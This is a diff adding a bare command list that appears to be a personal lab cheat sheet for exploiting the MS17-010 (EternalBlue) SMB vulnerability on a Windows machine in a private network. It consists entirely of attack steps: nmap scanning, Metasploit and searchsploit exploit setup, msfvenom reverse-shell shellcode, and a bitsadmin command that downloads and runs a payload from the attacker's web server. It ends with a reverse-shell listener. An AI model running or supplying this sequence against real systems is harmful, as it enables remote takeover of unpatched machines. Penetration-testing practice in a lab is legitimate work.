@@ -1,0 +1,38 @@
+ifconfig
+nmap 192.168.X.0/24
+nmap -PN 192.168.X.0/24
+Ifconfig | grep mask
+nmap -A 192.168.1.129
+msfconsole 
+search ms17
+show payloads
+set RHOST 192.168.1.129
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.128
+exploit
+searchsploit
+searchsploit ms17-010
+searchsploit -p windows/remote/42031.py
+cp /usr/share/exploitdb/exploits/windows/remote/42031.py  exploit.py
+python exploit.py
+sudo python2 -m pip install impacket
+msfvenom -a x86 --platform windows -p windows/shell/reverse_shell LHOST=192.168.1.128 LPORT=4444 > shellcode
+python exploit.py 192.168.1.129 shellcode 25
+python exploit.py
+wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py 
+Msfconsole
+search pipe
+use auxiliary/scanner/smb/pipe_auditor
+set RHOSTS 192.168.1.129
+run
+python exploit.py 192.168.1.129
+sudo systemctl start apache2
+bitsadmin /transfer pwn /download http://192.168.1.128/sc.exe C:\sc.exe 
+service_exec(conn, r'cmd /c /sc.exe')
+msfconsole
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set lhost 192.168.1.128
+set lport 9001
+Run
+python exploit.py 192.168.1.129
